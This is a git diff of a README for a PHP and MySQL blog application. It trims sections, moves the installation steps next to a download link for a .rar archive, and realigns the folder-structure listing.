@@ -8,9 +8,7 @@
 - [Installation](#installation)
 - [Usage](#usage)
 - [Folder Structure](#folder-structure)
-- [Contributing](#contributing)
-- [License](#license)
-- [Contact](#contact)
+
 
 ## Overview
 This Blog Application is a comprehensive platform built with PHP, MySQL, HTML, CSS, and JavaScript, designed to allow users to create, edit, and manage blog posts with rich multimedia content. It supports user authentication with role-based access control (Admin, Mentor, Student), ensuring secure and structured content management. The application features a responsive and intuitive UI suitable for both desktop and mobile devices.
@@ -40,7 +38,10 @@ This Blog Application is a comprehensive platform built with PHP, MySQL, HTML, C
 - Web server (Apache) with PHP support  
 - MySQL or MariaDB database server  
 - PHP 7.4+ recommended  
-- Local server environment recommended: [XAMPP](https://www.apachefriends.org/index.html)  
+- Local server environment recommended: [XAMPP](https://www.apachefriends.org/index.html)
+  
+### Steps
+1. **Clone the repository** 
 https://github.com/Charitardha555/Hackers-Gurukul/tree/02ab4a128b20d70c5e949d15166c2abd6b802926/Community%20Blog-site/v2.1.rar
 
 2. **Import the database schema**  
@@ -73,22 +74,16 @@ https://github.com/Charitardha555/Hackers-Gurukul/tree/02ab4a128b20d70c5e949d151
 ## Folder Structure
 blog-application/
 │
-├── assets/ # CSS, JavaScript, images, fonts
-├── config.php # Database config and global settings
-├── index.php # Home page - list of blog posts
-├── login.php # Login page
-├── register.php # User registration page
-├── logout.php # Logout script
-├── post/ # Create, edit, delete posts scripts
-├── comments/ # Manage comments scripts
-├── admin/ # Admin panel dashboard and management
-├── database/ # Database schema and seed files
-├── README.md # Project README file
-└── .gitignore # Git ignore file
+├── assets/                  # CSS, JavaScript, images, fonts
+├── config.php               # Database config and global settings
+├── index.php                # Home page - list of blog posts
+├── login.php                # Login page
+├── register.php             # User registration page
+├── logout.php               # Logout script
+├── post/                    # Create, edit, delete posts scripts
+├── comments/                # Manage comments scripts
+├── admin/                   # Admin panel dashboard and management
+├── database/                # Database schema and seed files
+├── README.md                # Project README file
+└── .gitignore               # Git ignore file
 
----
-
-Thank you for using this Blog Application! Your feedback and contributions are highly appreciated.
-
-### Steps
-1. **Clone the repository**  
